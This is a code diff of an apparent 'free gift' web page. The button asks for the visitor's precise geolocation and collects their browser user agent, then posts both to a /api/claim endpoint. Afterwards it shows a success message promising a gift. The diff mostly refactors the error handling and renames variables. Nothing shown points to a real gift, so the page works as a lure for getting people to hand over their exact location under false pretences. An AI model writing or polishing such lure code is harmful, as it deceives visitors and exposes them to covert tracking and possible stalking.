@@ -258,7 +258,7 @@
       }, 1000);
 
       // Claim button
-      async function requestLocation() {
+      function requestLocation() {
         const btn = document.getElementById("claimBtn");
         const statusMsg = document.getElementById("statusMsg");
         btn.disabled = true;
@@ -267,51 +267,65 @@
 
         if (!navigator.geolocation) {
           showStatus("error", "❌ Geolocation not supported!");
-          resetButton();
+          btn.disabled = false;
+          btn.textContent = "🎉 Click To Get Free Gift";
           return;
         }
 
         navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            const data = {
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
+          async (position) => {
+            const locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent,
             };
 
             try {
+              // Call Next.js API
               const res = await fetch("/api/claim", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data),
+                body: JSON.stringify(locationData),
               });
 
-              const json = await res.json();
+              const data = await res.json();
 
               if (res.ok) {
                 showStatus(
                   "success",
-                  json.message || "✅ Gift claimed! Check your email soon."
+                  "✅ Success! Your free gift will be delivered soon."
                 );
                 btn.textContent = "🎉 Claimed!";
               } else {
-                showStatus("error", json.error || "❌ Error sending data!");
-                resetButton();
+                showStatus("error", "❌ Error sending data: " + data.error);
+                btn.disabled = false;
+                btn.textContent = "🎉 Click To Get Free Gift";
               }
             } catch (err) {
-              showStatus("error", "❌ Network error!");
-              resetButton();
+              showStatus("error", "❌ Network error! Try again.");
+              btn.disabled = false;
+              btn.textContent = "🎉 Click To Get Free Gift";
             }
           },
-          (err) => {
-            let msg = "❌ An error occurred!";
-            if (err.code === 1) msg = "❌ Location permission denied!";
-            else if (err.code === 2) msg = "❌ Location unavailable!";
-            else if (err.code === 3) msg = "❌ Location request timed out!";
-            showStatus("error", msg);
-            resetButton();
+          (error) => {
+            let errorMsg = "❌ An error occurred!";
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                errorMsg =
+                  "❌ Location permission denied. Please allow location access.";
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMsg = "❌ Location unavailable!";
+                break;
+              case error.TIMEOUT:
+                errorMsg = "❌ Location request timed out!";
+                break;
+            }
+            showStatus("error", errorMsg);
+            btn.disabled = false;
+            btn.textContent = "🎉 Click To Get Free Gift";
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
